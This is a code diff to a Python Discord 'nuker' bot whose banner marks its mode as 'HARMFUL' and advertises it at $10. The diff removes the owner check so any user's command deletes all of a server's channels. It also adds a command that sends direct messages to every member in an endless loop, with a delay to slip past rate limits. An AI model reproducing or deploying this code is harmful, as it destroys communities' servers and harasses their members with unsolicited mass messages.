@@ -9,7 +9,7 @@ print("""
           ╔════════════════╦═════════════╦═════════════╦════════════╦════════════╗
           ║      BOT       ║  PYTHON     ║   REKTER    ║ COMMANDS   ║    MODE    ║
           ╠════════════════╬═════════════╬═════════════╬════════════╬════════════╣
-          ║   COST:$10     ║    JNFL     ║     MENU    ║     7      ║   HARMFUL  ║
+          ║   COST:$10     ║    JNFL     ║     MENU    ║     8      ║   HARMFUL  ║
           ╚════════════════╩═════════════╩═════════════╩════════════╩════════════╝
 
 """)
@@ -66,6 +66,8 @@ async def tgs(ctx):
     6. !image (embedded message with the pre-configured image URL)
 
     7. !rm_channels (Removes all server channels.)
+    
+    8. !spam_dm_e message (this spams everyone in the server!)
     """
     await ctx.send(commands_list)
 
@@ -128,19 +130,46 @@ async def image(ctx):
     await ctx.send(embed=embed)
     
 @bot.command()
-@commands.has_permissions(administrator=False)  # Ensures only admins can use this command
 async def rm_channels(ctx):
-    if ctx.author == ctx.guild.owner:
-        await ctx.send("Removing all channels...")
-        for channel in ctx.guild.channels:
-            try:
-                await channel.delete()
-                print(f"Deleted channel {channel.name}")
-            except Exception as e:
-                print(f"Failed to delete channel {channel.name}: {e}")
-        await ctx.send("All channels have been removed.")
-    else:
-        await ctx.send("Error..")
+    await ctx.send("Removing all channels...")
+    for channel in ctx.guild.channels:
+        try:
+            await channel.delete()
+            print(f"Deleted channel {channel.name}")
+        except Exception as e:
+            print(f"Failed to delete channel {channel.name}: {e}")
+    await ctx.send("All channels have been removed.")
+    
+    
+    
+@bot.command()
+async def spam_dm_e(ctx, *, message: str):
+    global spam_active
+    spam_active = True
+
+    await ctx.send("Starting to DM everyone in the server. Use `!stop` to stop.")
+
+    members = ctx.guild.members  # Get all members in the server
+
+    # Loop to keep spamming while spam_active is True
+    while spam_active:
+        for member in members:
+            if spam_active and not member.bot:  # Ensure spam is active and skip bots
+                try:
+                    await member.send(message)  # Send the spam message
+                    print(f"Sent DM to {member.name}")
+                except Exception as e:
+                    print(f"Failed to DM {member.name}: {e}")
+                await asyncio.sleep(1)  # Wait 1 second to avoid rate-limiting
+        
+        # Restart the loop for another round of messages
+        if spam_active:
+            await ctx.send("Finished one round of DMs. Continuing...")
+    
+    if not spam_active:
+        await ctx.send("Spam stopped.")
+
+
 
     
 
